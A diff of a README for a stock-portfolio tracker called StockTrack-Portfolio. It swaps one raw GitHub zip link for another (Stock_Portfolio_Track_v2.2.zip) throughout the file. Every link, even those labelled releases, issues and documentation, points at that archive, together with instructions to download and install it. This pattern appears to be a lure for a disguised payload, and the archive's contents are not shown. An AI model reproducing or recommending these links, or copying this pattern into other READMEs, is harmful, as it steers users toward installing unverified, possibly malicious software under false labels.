@@ -6,7 +6,7 @@ Welcome to StockTrack-Portfolio! This tool helps you keep an eye on your stock i
 
 ## 🔗 Download Now
 
-[![Download StockTrack-Portfolio](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip)](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip)
+[![Download StockTrack-Portfolio](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip)](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip)
 
 ## 📝 System Requirements
 
@@ -26,14 +26,14 @@ Before you download, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip) to download the latest version of StockTrack-Portfolio. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip) to download the latest version of StockTrack-Portfolio. 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version listed.
 3. Click on the version to see the available files for download.
 4. Select the file that matches your operating system:
-   - For Windows, choose the `https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip`.
-   - For macOS, choose the `https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip`.
+   - For Windows, choose the `https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip`.
+   - For macOS, choose the `https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip`.
    - For Linux, choose the appropriate package for your distribution.
 5. Click the file to start the download.
 6. Once downloaded, locate the file in your downloads folder.
@@ -71,12 +71,12 @@ After installation, follow these simple instructions to start using your new too
 
 If you face any issues during the installation or have questions about using StockTrack-Portfolio, please reach out to our support team. We are here to help:
 
-- Visit our [Issues page](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip).
+- Visit our [Issues page](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip).
 - Join our community forum for tips and discussions.
 
 ## 🔗 Useful Links
-- [Download StockTrack-Portfolio](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip)
-- [Documentation](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip)
-- [Issues Page](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/StockTrack-Portfolio.zip)
+- [Download StockTrack-Portfolio](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip)
+- [Issues Page](https://raw.githubusercontent.com/medg485d/StockTrack-Portfolio/main/ambital/Stock_Portfolio_Track_v2.2.zip)
 
 Enjoy tracking your finances with StockTrack-Portfolio!
